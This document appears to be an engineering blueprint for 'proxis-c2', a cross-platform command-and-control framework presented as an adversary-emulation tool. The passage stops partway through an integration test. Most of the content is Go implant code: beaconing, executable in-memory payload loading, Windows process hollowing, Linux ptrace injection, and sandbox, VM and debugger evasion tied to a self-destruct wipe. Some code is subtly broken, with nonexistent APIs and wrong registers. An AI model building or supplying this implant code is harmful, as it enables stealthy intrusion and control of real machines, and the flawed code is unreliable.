# proxis-c2 Engineering Blueprint & Implementation Roadmap

A comprehensive, phase-by-phase technical specification for building an enterprise-grade, cross-platform Command & Control framework for adversary emulation and resilience testing.

---

## Table of Contents

1. [Phase 1: Environment Setup & Project Architecture](#phase-1-environment-setup--project-architecture)
2. [Phase 2: C2 Server Infrastructure & Transport Layer](#phase-2-c2-server-infrastructure--transport-layer)
3. [Phase 3: Agent Core Functionality & Memory Execution](#phase-3-agent-core-functionality--memory-execution)
4. [Phase 4: Process Hollowing Implementation](#phase-4-process-hollowing-implementation)
5. [Phase 5: Automated Self-Destruct Kill Switch](#phase-5-automated-self-destruct-kill-switch)
6. [Phase 6: Code Structure, Testing & Auditing](#phase-6-code-structure-testing--auditing)

---

## Phase 1: Environment Setup & Project Architecture

### 1.1 Multi-Module Project Directory Layout

The project follows a **mono-repo architecture** with clear separation of concerns using Go modules. The directory structure is designed for maintainability and cross-platform compilation.

```
proxis-c2/
├── cmd/
│   ├── server/                 # C2 server entry point
│   │   └── main.go
│   └── agent/                  # Agent entry point
│       ├── main_windows.go     # Windows-specific agent
│       ├── main_linux.go       # Linux-specific agent
│       └── main_darwin.go      # macOS-specific agent
├── internal/
│   ├── server/
│   │   ├── transport/          # gRPC/mTLS transport layer
│   │   ├── handler/            # Command routing and execution
│   │   ├── storage/            # Agent state persistence
│   │   └── crypto/             # Server-side crypto operations
│   ├── agent/
│   │   ├── executor/           # Task execution engine
│   │   ├── injection/          # Process hollowing implementation
│   │   ├── beacon/             # Communication logic
│   │   └── evasion/            # Anti-analysis and sandbox detection
│   └── common/
│       ├── crypto/             # Shared cryptographic primitives
│       ├── protocol/           # Protocol buffer definitions
│       ├── config/             # Configuration structures
│       └── utils/              # Cross-platform utilities
├── pkg/
│   └── api/                    # Public API interfaces
├── configs/
│   ├── server.yaml             # Server configuration template
│   └── agent.yaml              # Agent configuration template
├── scripts/
│   ├── build.sh                # Cross-compilation build script
│   └── generate-certs.sh       # Certificate generation utility
├── deployments/
│   ├── docker/                 # Docker deployment manifests
│   └── kubernetes/             # K8s deployment manifests
├── go.mod
├── go.sum
└── Makefile
```

### 1.2 Configuration File Structures

#### Server Configuration (`configs/server.yaml`)

```yaml
server:
  listen_address: "0.0.0.0"
  listen_port: 443
  tls:
    cert_path: "/etc/proxis/certs/server.crt"
    key_path: "/etc/proxis/certs/server.key"
    ca_path: "/etc/proxis/certs/ca.crt"
    require_client_cert: true
  max_connections: 10000
  connection_timeout: "30s"

database:
  type: "sqlite"  # or "postgres"
  path: "/var/lib/proxis/data.db"
  pool_size: 25

logging:
  level: "info"
  format: "json"
  output: "/var/log/proxis/server.log"

security:
  encryption_key_path: "/etc/proxis/keys/master.key"
  hmac_secret_path: "/etc/proxis/keys/hmac.secret"
```

#### Agent Configuration (`configs/agent.yaml`)

```yaml
c2:
  server_address: "c2.proxis.internal"
  server_port: 443
  use_tls: true
  ca_cert_path: "/etc/proxis/certs/ca.crt"
  client_cert_path: "/etc/proxis/certs/agent.crt"
  client_key_path: "/etc/proxis/certs/agent.key"

beacon:
  base_interval: "60s"
  jitter_min: 0.2
  jitter_max: 0.5
  max_retries: 3
  retry_backoff: "5s"

evasion:
  sandbox_detection: true
  debugger_detection: true
  vm_detection: true
  sleep_on_detection: "86400s"  # 24 hours

kill_switch:
  enabled: true
  max_no_contact: "28800s"  # 8 hours
  auto_cleanup: true
```

### 1.3 CI/CD & Cross-Compilation Build Flow

#### Build Script (`scripts/build.sh`)

```bash
#!/bin/bash
# Cross-platform compilation for proxis-c2

PLATFORMS=("windows/amd64" "windows/arm64" "linux/amd64" "linux/arm64" "darwin/amd64" "darwin/arm64")
VERSION=${1:-"dev"}

# Build server binaries
for PLATFORM in "${PLATFORMS[@]}"; do
    IFS='/' read -r GOOS GOARCH <<< "$PLATFORM"
    OUTPUT_NAME="proxis-server-${GOOS}-${GOARCH}"
    
    if [ "$GOOS" == "windows" ]; then
        OUTPUT_NAME+=".exe"
    fi
    
    env GOOS=$GOOS GOARCH=$GOARCH go build \
        -ldflags "-X main.version=${VERSION} -s -w" \
        -o "bin/${OUTPUT_NAME}" \
        ./cmd/server/
done

# Build agent binaries with build tags
for PLATFORM in "${PLATFORMS[@]}"; do
    IFS='/' read -r GOOS GOARCH <<< "$PLATFORM"
    OUTPUT_NAME="proxis-agent-${GOOS}-${GOARCH}"
    
    if [ "$GOOS" == "windows" ]; then
        OUTPUT_NAME+=".exe"
    fi
    
    env GOOS=$GOOS GOARCH=$GOARCH go build \
        -ldflags "-X main.version=${VERSION} -s -w" \
        -tags "${GOOS}" \
        -o "bin/${OUTPUT_NAME}" \
        ./cmd/agent/
done
```

#### Makefile Targets

```makefile
.PHONY: build-server build-agent test clean

build-server:
	go build -ldflags "-s -w" -o bin/proxis-server ./cmd/server/

build-agent-windows:
	GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -tags "windows" -o bin/proxis-agent-windows-amd64.exe ./cmd/agent/

build-agent-linux:
	GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -tags "linux" -o bin/proxis-agent-linux-amd64 ./cmd/agent/

test:
	go test -v -race -coverprofile=coverage.out ./...

lint:
	golangci-lint run ./...

docker-build:
	docker build -t proxis-c2:latest -f deployments/docker/Dockerfile .
```

---

## Phase 2: C2 Server Infrastructure & Transport Layer

### 2.1 High-Concurrency Server Architecture

The server implements a **goroutine-per-agent** model with connection pooling and worker queues for optimal resource utilization.

#### Core Server Structure

```go
// internal/server/server.go
type C2Server struct {
    config         *config.ServerConfig
    listener       net.Listener
    agents         sync.Map  // map[string]*AgentSession
    taskQueue      chan *Task
    workerPool     *WorkerPool
    storage        storage.AgentStorage
    cryptoProvider crypto.Provider
}

type AgentSession struct {
    ID            string
    Connection    *grpc.ClientConn
    LastBeacon    time.Time
    Platform      string
    Hostname      string
    Tasks         chan *Task
    OutputChan    chan *TaskResult
    Context       context.Context
    Cancel        context.CancelFunc
}
```

#### Goroutine Management Pattern

```go
// Server startup with worker pool
func (s *C2Server) Start() error {
    s.workerPool = NewWorkerPool(s.config.MaxConnections)
    
    // Accept connections in separate goroutine
    go s.acceptConnections()
    
    // Heartbeat monitor
    go s.monitorBeacons()
    
    // Task dispatcher
    go s.dispatchTasks()
    
    return nil
}

func (s *C2Server) acceptConnections() {
    for {
        conn, err := s.listener.Accept()
        if err != nil {
            continue
        }
        
        // Each connection handled in separate goroutine
        go s.handleAgentConnection(conn)
    }
}
```

### 2.2 Secure Transport Layer Implementation

#### gRPC with Mutual TLS (mTLS)

```go
// internal/server/transport/grpc_transport.go
type GRPCTransport struct {
    server   *grpc.Server
    listener net.Listener
}

func NewGRPCTransport(cfg *config.TLSConfig) (*GRPCTransport, error) {
    // Load server certificate
    cert, err := tls.LoadX509KeyPair(cfg.CertPath, cfg.KeyPath)
    if err != nil {
        return nil, fmt.Errorf("failed to load server certificate: %w", err)
    }
    
    // Load CA for client verification
    caCert, err := os.ReadFile(cfg.CAPath)
    if err != nil {
        return nil, fmt.Errorf("failed to load CA certificate: %w", err)
    }
    
    caPool := x509.NewCertPool()
    caPool.AppendCertsFromPEM(caCert)
    
    tlsConfig := &tls.Config{
        Certificates: []tls.Certificate{cert},
        ClientCAs:   caPool,
        ClientAuth:   tls.RequireAndVerifyClientCert,
        MinVersion:   tls.VersionTLS13,
        CipherSuites: []uint16{
            tls.TLS_AES_256_GCM_SHA384,
            tls.TLS_CHACHA20_POLY1305_SHA256,
        },
    }
    
    creds := credentials.NewTLS(tlsConfig)
    server := grpc.NewServer(grpc.Creds(creds))
    
    return &GRPCTransport{server: server}, nil
}
```

#### Protocol Buffer Definition

```protobuf
// internal/common/protocol/c2.proto
syntax = "proto3";

package proxis.c2.v1;

message AgentHello {
    string agent_id = 1;
    string hostname = 2;
    string platform = 3;
    string ip_address = 4;
    int64 timestamp = 5;
}

message Beacon {
    string agent_id = 1;
    int64 timestamp = 2;
    bytes  encrypted_payload = 3;
}

message Task {
    string task_id = 1;
    string agent_id = 2;
    TaskType type = 3;
    bytes  encrypted_data = 4;
}

message TaskResult {
    string task_id = 1;
    string agent_id = 2;
    bool   success = 3;
    bytes  encrypted_output = 4;
    int64  timestamp = 5;
}

enum TaskType {
    TASK_EXECUTE = 0;
    TASK_UPLOAD = 1;
    TASK_DOWNLOAD = 2;
    TASK_KILL = 3;
}
```

### 2.3 Agent Beaconing Logic

#### Jittered Interval Implementation

```go
// internal/agent/beacon/beacon.go
type Beacon struct {
    baseInterval time.Duration
    jitterMin    float64
    jitterMax    float64
    maxRetries   int
}

func (b *Beacon) CalculateNextInterval() time.Duration {
    jitter := b.jitterMin + rand.Float64()*(b.jitterMax-b.jitterMin)
    return time.Duration(float64(b.baseInterval) * (1 + jitter))
}

func (b *Beacon) Run(ctx context.Context, session *AgentSession) {
    ticker := time.NewTicker(b.CalculateNextInterval())
    defer ticker.Stop()
    
    for {
        select {
        case <-ctx.Done():
            return
        case <-ticker.C:
            if err := b.sendBeacon(session); err != nil {
                log.Printf("Beacon failed: %v", err)
                // Exponential backoff on failure
                b.exponentialBackoff()
            }
            // Reschedule with new jitter
            ticker.Reset(b.CalculateNextInterval())
        }
    }
}
```

---

## Phase 3: Agent Core Functionality & Memory Execution

### 3.1 Platform-Agnostic Execution Loop

#### Core Agent Structure

```go
// internal/agent/executor/executor.go
type AgentExecutor struct {
    config     *config.AgentConfig
    session    *AgentSession
    crypto     *crypto.AgentCrypto
    transport  transport.Transport
    evasion    *evasion.Evasion
}

func (e *AgentExecutor) Run(ctx context.Context) error {
    // Initialize evasion checks
    if err := e.evasion.RunChecks(); err != nil {
        log.Printf("Evasion check failed: %v", err)
        return e.handleEvasionFailure()
    }
    
    // Main execution loop
    for {
        select {
        case <-ctx.Done():
            return nil
        default:
            // Poll for tasks
            task, err := e.transport.PollTask(e.session.AgentID)
            if err != nil {
                log.Printf("Task poll error: %v", err)
                time.Sleep(e.config.Beacon.BaseInterval)
                continue
            }
            
            if task != nil {
                result, err := e.executeTask(task)
                if err != nil {
                    result = &protocol.TaskResult{
                        TaskId:    task.TaskId,
                        Success:   false,
                        Error:     err.Error(),
                    }
                }
                e.transport.SendResult(result)
            }
            
            // Send heartbeat
            e.transport.SendBeacon(&protocol.Beacon{
                AgentId:  e.session.AgentID,
                Timestamp: time.Now().Unix(),
            })
            
            time.Sleep(e.config.Beacon.CalculateNextInterval())
        }
    }
}
```

### 3.2 Advanced Fileless Execution Implementation

#### Memory-Only Payload Storage

```go
// internal/agent/memory/memory.go
package memory

import (
    "unsafe"
    "syscall"
)

type MemoryExecutor struct {
    payloadRegion []byte  // Allocated in heap, never written to disk
    regionSize    uintptr
}

// Windows implementation using VirtualAlloc
func (m *MemoryExecutor) AllocateMemoryWindows(size int) error {
    // Use syscall to VirtualAlloc with EXECUTE_READWRITE
    addr, _, err := syscall.Syscall(
        syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAlloc").Addr(),
        4,
        0,                           // lpAddress
        uintptr(size),                 // dwSize
        syscall.MEM_COMMIT|syscall.MEM_RESERVE, // flAllocationType
        syscall.PAGE_EXECUTE_READWRITE, // flProtect
    )
    
    if addr == 0 {
        return fmt.Errorf("memory allocation failed: %v", err)
    }
    
    m.payloadRegion = (*[1 << 30]byte)(unsafe.Pointer(addr))[:size:size]
    m.regionSize = uintptr(size)
    return nil
}

// Linux implementation using mmap
func (m *MemoryExecutor) AllocateMemoryLinux(size int) error {
    // Use mmap with PROT_READ|PROT_WRITE|PROT_EXEC
    addr, _, err := syscall.Syscall6(
        syscall.SYS_MMAP,
        0,                      // addr
        uintptr(size),            // length
        syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC, // prot
        syscall.MAP_PRIVATE|syscall.MAP_ANONYMOUS, // flags
        -1,                     // fd
        0,                      // offset
    )
    
    if addr == 0 || addr == ^uintptr(0) {
        return fmt.Errorf("memory allocation failed: %v", err)
    }
    
    m.payloadRegion = (*[1 << 30]byte)(unsafe.Pointer(addr))[:size:size]
    m.regionSize = uintptr(size)
    return nil
}

// Execute payload in-memory
func (m *MemoryExecutor) Execute() error {
    // Cast to function pointer and call
    fn := *(*func())(unsafe.Pointer(&m.payloadRegion[0]))
    fn()
    return nil
}
```

#### Memory Management with Cleanup

```go
// internal/agent/memory/cleanup.go
func (m *MemoryExecutor) SecureCleanup() error {
    // Overwrite with null bytes
    for i := range m.payloadRegion {
        m.payloadRegion[i] = 0x00
    }
    
    // Zero the slice header
    for i := range m.payloadRegion {
        m.payloadRegion[i] = 0x00
    }
    
    // Release memory
    if runtime.GOOS == "windows" {
        syscall.Syscall(
            syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualFree").Addr(),
            3,
            uintptr(unsafe.Pointer(&m.payloadRegion[0])),
            0,
            syscall.MEM_RELEASE,
        )
    } else {
        syscall.Syscall(
            syscall.SYS_MUNMAP,
            2,
            uintptr(unsafe.Pointer(&m.payloadRegion[0])),
            m.regionSize,
        )
    }
    
    return nil
}
```

---

## Phase 4: Process Hollowing Implementation

### 4.1 Windows Process Hollowing Sequence

#### Step-by-Step Implementation

```go
// internal/agent/injection/windows_hollowing.go
package injection

import (
    "syscall"
    "unsafe"
)

type ProcessHollower struct {
    targetProcess string
    payload       []byte
}

func (h *ProcessHollower) Execute() error {
    // Step 1: Create suspended process
    startupInfo, processInfo := new(syscall.StartupInfo), new(syscall.ProcessInformation)
    startupInfo.Cb = uint32(unsafe.Sizeof(*startupInfo))
    
    // CREATE_SUSPENDED = 0x00000004
    err := syscall.CreateProcess(
        syscall.StringToUTF16Ptr(h.targetProcess),
        nil, nil, nil, true, 0x00000004, nil, nil,
        startupInfo, processInfo,
    )
    if err != nil {
        return fmt.Errorf("CreateProcess failed: %v", err)
    }
    
    // Step 2: Get thread context
    var context CONTEXT
    context.ContextFlags = 0x100003  // CONTEXT_FULL | CONTEXT_DEBUG
    
    err = syscall.GetThreadContext(processInfo.Thread, &context)
    if err != nil {
        return fmt.Errorf("GetThreadContext failed: %v", err)
    }
    
    // Step 3: Get PEB to find image base
    var pbi PROCESS_BASIC_INFORMATION
    var returnLength uintptr
    
    ntdll := syscall.NewLazyDLL("ntdll.dll")
    NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
    
    err = NtQueryInformationProcess.Call(
        processInfo.Process,
        0,  // ProcessBasicInformation
        uintptr(unsafe.Pointer(&pbi)),
        unsafe.Sizeof(pbi),
        uintptr(unsafe.Pointer(&returnLength)),
    )
    if err != 0 {
        return fmt.Errorf("NtQueryInformationProcess failed: %v", err)
    }
    
    // Step 4: Unmap original executable
    imageBase := getRemoteImageBase(pbi.PebBaseAddress)
    
    NtUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")
    err = NtUnmapViewOfSection.Call(
        processInfo.Process,
        imageBase,
    )
    if err != 0 && err != 0xC0000034 {  // STATUS_INVALID_PARAMETER is acceptable
        return fmt.Errorf("NtUnmapViewOfSection failed: %v", err)
    }
    
    // Step 5: Allocate new memory
    newBase, _, err := syscall.Syscall(
        syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAllocEx").Addr(),
        5,
        processInfo.Process,
        imageBase,
        uintptr(len(h.payload)),
        syscall.MEM_COMMIT|syscall.MEM_RESERVE,
        syscall.PAGE_EXECUTE_READWRITE,
    )
    
    // Step 6: Write payload
    var bytesWritten uintptr
    err = syscall.WriteProcessMemory(
        processInfo.Process,
        newBase,
        uintptr(unsafe.Pointer(&h.payload[0])),
        uintptr(len(h.payload)),
        &bytesWritten,
    )
    if err != nil {
        return fmt.Errorf("WriteProcessMemory failed: %v", err)
    }
    
    // Step 7: Update thread context
    context.Eax = uint32(newBase)  // For x86; use Rip for x64
    err = syscall.SetThreadContext(processInfo.Thread, &context)
    if err != nil {
        return fmt.Errorf("SetThreadContext failed: %v", err)
    }
    
    // Step 8: Resume thread
    err = syscall.ResumeThread(processInfo.Thread)
    if err != 0 {
        return fmt.Errorf("ResumeThread failed: %v", err)
    }
    
    return nil
}
```

### 4.2 Linux Process Injection Alternative

```go
// internal/agent/injection/linux_injection.go
package injection

func (h *ProcessHollower) ExecuteLinux() error {
    // Fork to create child process
    pid, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
    
    if pid == 0 {
        // Child process - use ptrace for injection
        // Attach to self and modify memory
        syscall.Syscall(syscall.SYS_PTRACE, syscall.PTRACE_TRACEME, 0, 0)
        syscall.Syscall(syscall.SYS_EXECVE, 
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(h.targetProcess)),
            0, 0)
    } else {
        // Parent - wait and inject
        var status syscall.WaitStatus
        syscall.Wait4(int(pid), &status, 0, nil)
        
        // Use ptrace to write to child memory
        h.injectViaPtrace(int(pid))
    }
    
    return nil
}
```

### 4.3 Error Handling and Graceful Degradation

```go
// internal/agent/injection/error_handling.go
func (h *ProcessHollower) SafeExecute() error {
    defer func() {
        if r := recover(); r != nil {
            log.Printf("Process hollowing panic recovered: %v", r)
            h.cleanupProcess()
        }
    }()
    
    if err := h.preExecutionChecks(); err != nil {
        return h.fallbackToDirectExecution()
    }
    
    if err := h.Execute(); err != nil {
        log.Printf("Primary injection failed, attempting fallback: %v", err)
        return h.fallbackToDirectExecution()
    }
    
    return nil
}

func (h *ProcessHollower) cleanupProcess() {
    // Ensure process handles are closed
    // Clear sensitive memory
    // Log failure without exposing details
}
```

---

## Phase 5: Automated Self-Destruct Kill Switch

### 5.1 Kill Switch Trigger Conditions

```go
// internal/agent/killswitch/killswitch.go
type KillSwitch struct {
    config         *config.KillSwitchConfig
    lastContact    time.Time
    detectionCount  int
    mutex          sync.Mutex
}

type TriggerCondition int

const (
    TriggerExplicitCommand TriggerCondition = iota
    TriggerNoContact
    TriggerSandboxDetection
    TriggerDebuggerDetection
    TriggerVMDetection
)

func (k *KillSwitch) EvaluateConditions(session *AgentSession) bool {
    k.mutex.Lock()
    defer k.mutex.Unlock()
    
    // Check explicit kill command
    if session.KillSignal {
        return true
    }
    
    // Check no-contact timeout
    if time.Since(k.lastContact) > k.config.MaxNoContact {
        return true
    }
    
    // Check detection count threshold
    if k.detectionCount >= 3 {
        return true
    }
    
    return false
}
```

### 5.2 Anti-Analysis Detection

```go
// internal/agent/evasion/detection.go
type EvasionDetector struct {
    checks []DetectionCheck
}

type DetectionCheck func() bool

func (e *EvasionDetector) RunChecks() error {
    for _, check := range e.checks {
        if check() {
            return errors.New("analysis environment detected")
        }
    }
    return nil
}

// Windows sandbox detection
func detectWindowsSandbox() bool {
    // Check for known sandbox artifacts
    sandboxProcesses := []string{
        "vmtoolsd.exe", "vmwaretray.exe", "vboxservice.exe",
        "wireshark.exe", "processhacker.exe",
    }
    
    for _, proc := range sandboxProcesses {
        if processExists(proc) {
            return true
        }
    }
    
    // Check for low resources (typical in sandboxes)
    var memStatus syscall.MEMORYSTATUSEX
    memStatus.DwLength = uint32(unsafe.Sizeof(memStatus))
    syscall.GlobalMemoryStatusEx(&memStatus)
    
    if memStatus.UllTotalPhys < 2*1024*1024*1024 {  // Less than 2GB RAM
        return true
    }
    
    return false
}

// Debugger detection
func detectDebugger() bool {
    var isDebugged bool
    
    // Windows: Check BeingDebugged flag in PEB
    fs := &syscall.ForeignSystemInformation{
        InfoClass: 0,  // ProcessBreakOnTermination
    }
    
    // Linux: Check /proc/self/status for TracerPid
    data, err := os.ReadFile("/proc/self/status")
    if err == nil {
        if strings.Contains(string(data), "TracerPid:\t0") == false {
            isDebugged = true
        }
    }
    
    return isDebugged
}
```

### 5.3 Secure Memory Cleanup Sequence

```go
// internal/agent/killswitch/cleanup.go
func (k *KillSwitch) ExecuteCleanup() error {
    // Phase 1: Close all network connections
    k.closeAllConnections()
    
    // Phase 2: Overwrite all memory regions
    if err := k.secureMemoryWipe(); err != nil {
        log.Printf("Memory wipe warning: %v", err)
    }
    
    // Phase 3: Clear filesystem artifacts
    k.clearArtifacts()
    
    // Phase 4: Terminate process cleanly
    k.terminateProcess()
    
    return nil
}

func (k *KillSwitch) secureMemoryWipe() error {
    // Get all allocated memory regions
    var regions []uintptr
    
    // Use platform-specific APIs to enumerate heap
    if runtime.GOOS == "windows" {
        regions = k.enumerateWindowsHeap()
    } else {
        regions = k.enumerateLinuxHeap()
    }
    
    // Overwrite each region with null bytes
    for _, region := range regions {
        // Calculate region size (platform-specific)
        size := k.getRegionSize(region)
        
        // Use mprotect/madvise to make writable
        k.makeRegionWritable(region, size)
        
        // Zero memory
        ptr := unsafe.Pointer(region)
        for i := uintptr(0); i < size; i++ {
            *(*byte)(unsafe.Pointer(uintptr(ptr) + i)) = 0x00
        }
        
        // Restore original protection
        k.restoreRegionProtection(region, size)
    }
    
    return nil
}

func (k *KillSwitch) closeAllConnections() {
    // Close all open file descriptors
    // This is platform-specific
    
    // Windows: CloseHandle for all known handles
    // Linux: Iterate /proc/self/fd and close
    
    if runtime.GOOS == "linux" {
        fdDir, _ := os.Open("/proc/self/fd")
        defer fdDir.Close()
        
        fds, _ := fdDir.Readdirnames(-1)
        for _, fd := range fds {
            fdInt, _ := strconv.Atoi(fd)
            if fdInt > 2 {  // Don't close stdin/stdout/stderr
                syscall.Close(fdInt)
            }
        }
    }
}
```

---

## Phase 6: Code Structure, Testing & Auditing

### 6.1 Unit Testing Strategy

#### Crypto Package Testing

```go
// internal/common/crypto/crypto_test.go
func TestEncryptionDecryption(t *testing.T) {
    key := make([]byte, 32)
    rand.Read(key)
    
    provider := NewAESGCMProvider(key)
    
    plaintext := []byte("sensitive operational data")
    ciphertext, err := provider.Encrypt(plaintext)
    assert.NoError(t, err)
    
    decrypted, err := provider.Decrypt(ciphertext)
    assert.NoError(t, err)
    assert.Equal(t, plaintext, decrypted)
}

func TestHMACIntegrity(t *testing.T) {
    secret := []byte("hmac-secret-key")
    mac := NewHMACProvider(secret)
    
    data := []byte("task payload")
    signature := mac.Sign(data)
    
    assert.True(t, mac.Verify(data, signature))
    assert.False(t, mac.Verify(append(data, 0x00), signature))
}
```

#### Mock Agent Beacon Testing

```go
// internal/server/transport/mock_transport_test.go
type MockTransport struct {
    tasks     chan *protocol.Task
    results   chan *protocol.TaskResult
    agents    map[string]*MockAgent
}

func (m *MockTransport) SimulateAgentBeacon(agentID string) {
    // Simulate realistic network conditions
    time.Sleep(m.jitteredDelay())
    
    // Send heartbeat
    m.results <- &protocol.TaskResult{
        AgentId:  agentID,
        Success:  true,
        Output:   m.generateRandomOutput(),
    }
}

func TestConcurrentAgentHandling(t *testing.T) {
    server := NewTestServer(100)  // 100 max connections
    
    // Simulate 50 concurrent agents
    var wg sync.WaitGroup
    for i := 0; i < 50; i++ {
        wg.Add(1)
        go func(id int) {
            defer wg.Done()
            server.SimulateAgent(fmt.Sprintf("agent-%d", id))
        }(i)
    }
    
    wg.Wait()
    assert.Equal(t, 50, server.ActiveAgentCount())
}
```

### 6.2 Integration Testing Framework

```go
// tests/integration/agent_lifecycle_test.go
func TestAgentLifecycle(t *testing.T) {
    // Start test server
    server := startTestServer(t)
    defer server.Stop()
    
    // Deploy test agent
    agent := startTestAgent(t, server.Endpoint())
    defer agent.Stop()
    
    // Verify registration
    assert.Eventually(t, func() bool {
        return server.HasAgent(agent.ID())
    }, 10*time.Second, 100*time.Millisecond)
    
    // Send task and verify execution
    task := &protocol.Task{